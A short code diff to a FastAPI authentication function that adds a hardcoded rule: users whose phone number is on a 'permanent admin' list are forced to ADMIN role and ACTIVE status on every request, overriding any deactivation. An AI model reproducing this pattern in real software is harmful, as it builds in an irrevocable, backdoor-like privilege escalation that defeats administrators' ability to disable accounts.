@@ -10,6 +10,7 @@ from sqlalchemy import select
 from sqlalchemy.ext.asyncio import AsyncSession
 from sqlalchemy.orm import selectinload
 
+from app.core.admins import is_permanent_admin_phone
 from app.core.database import get_db
 from app.core.security import decode_access_token
 from app.models.user import User, UserRole
@@ -35,7 +36,12 @@ async def get_current_user(
         select(User).options(selectinload(User.profile)).where(User.id == user_id)
     )
     user = result.scalar_one_or_none()
-    if user is None or user.status != "ACTIVE":
+    if user is None:
+        raise HTTPException(status_code=status.HTTP_401_UNAUTHORIZED, detail="User inactive")
+    if is_permanent_admin_phone(user.phone):
+        user.role = UserRole.ADMIN.value
+        user.status = "ACTIVE"
+    if user.status != "ACTIVE":
         raise HTTPException(status_code=status.HTTP_401_UNAUTHORIZED, detail="User inactive")
     return user
 
